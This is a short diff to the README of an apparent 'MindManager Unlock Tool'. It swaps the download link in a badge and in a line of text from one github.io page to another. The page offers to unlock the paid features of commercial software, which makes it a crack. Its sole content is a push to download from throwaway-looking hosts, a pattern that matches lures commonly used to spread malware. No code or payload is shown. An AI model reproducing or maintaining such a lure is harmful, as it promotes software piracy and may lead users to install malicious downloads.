@@ -6,7 +6,7 @@
 <h1 align="center">⚡ MindManager Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/329" target="_blank">
+  <a href="https://mindmanagerload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20MindManager%20Unlock%20Tool-Enable%20All%20Features-0078D7?style=for-the-badge&logo=mindjet&logoColor=white" 
          alt="Download MindManager Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -96,7 +96,7 @@ Have feedback or want to contribute? Open an issue or submit a pull request.
 ## ⭐ Unlock MindManager – Advanced Mind Mapping & Project Planning
 
 Unlock all premium features of MindManager.  
-[Download the Unlock Tool](https://hiopal3847.github.io/.github/329) and enhance your productivity and creativity.
+[Download the Unlock Tool](https://mindmanagerload.github.io/.github/) and enhance your productivity and creativity.
 
 ---
 
